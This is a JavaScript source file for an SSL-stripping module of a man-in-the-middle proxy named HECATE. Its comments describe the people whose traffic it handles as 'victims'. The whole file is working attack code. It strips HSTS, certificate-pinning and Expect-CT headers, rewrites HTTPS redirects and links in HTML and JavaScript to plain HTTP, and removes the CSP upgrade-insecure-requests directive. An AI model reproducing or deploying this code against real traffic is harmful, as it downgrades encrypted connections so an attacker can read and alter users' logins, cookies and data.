'use strict';

/**
 * HECATE MITM — SSL Stripper
 * Rewrites HTTPS references in responses to HTTP so victims don't
 * get redirected to the real HTTPS site when behind the proxy.
 *
 * Targets:
 *   - Location: headers (redirect responses)
 *   - href="https://" in HTML
 *   - src="https://" in HTML
 *   - Content-Security-Policy upgrade-insecure-requests directive
 *   - HSTS headers (stripped entirely)
 *
 * Pure functions — no side effects.
 */

// Headers to strip that enforce HTTPS
const STRIP_HEADERS = new Set([
  'strict-transport-security',
  'public-key-pins',
  'public-key-pins-report-only',
  'expect-ct',
]);

/**
 * Strip HTTPS enforcement from response headers.
 * @param {object} headers  - original response headers
 * @param {string} host     - target hostname (for scope-limited stripping)
 * @returns {object}        - modified headers
 */
function stripHeaders(headers, host) {
  const out = {};
  for (const [k, v] of Object.entries(headers)) {
    const key = k.toLowerCase();

    // Strip HSTS and pinning headers entirely
    if (STRIP_HEADERS.has(key)) continue;

    // Rewrite Location: redirect to HTTP
    if (key === 'location' && v) {
      out[k] = host ? v.replace(`https://${host}`, `http://${host}`) : v.replace(/^https:\/\//i, 'http://');
      continue;
    }

    // Strip upgrade-insecure-requests from CSP
    if (key === 'content-security-policy') {
      out[k] = v.replace(/;\s*upgrade-insecure-requests/gi, '')
                .replace(/upgrade-insecure-requests\s*;?/gi, '');
      continue;
    }

    out[k] = v;
  }
  return out;
}

/**
 * Rewrite HTTPS URLs in an HTML/JS response body.
 * @param {string} body
 * @param {string} host   - scope to this host only (optional)
 * @returns {string}
 */
function stripBody(body, host) {
  if (!body) return body;

  if (host) {
    // Scope-limited: only rewrite this specific host
    return body.replaceAll(`https://${host}`, `http://${host}`);
  }

  // Global: rewrite all https:// in attribute values and JS strings
  return body
    .replace(/(href|src|action|url)\s*=\s*["'](https:\/\/)/gi, (_, attr, scheme) => `${attr}="http://`)
    .replace(/:\s*["'](https:\/\/)/g, ': "http://');
}

/**
 * Check if a response should be SSL-stripped.
 * Skip binary content types.
 */
function shouldStrip(contentType) {
  const ct = (contentType ?? '').toLowerCase();
  return ct.includes('text/') ||
         ct.includes('application/javascript') ||
         ct.includes('application/json') ||
         ct.includes('application/xml');
}

module.exports = { stripHeaders, stripBody, shouldStrip, STRIP_HEADERS };
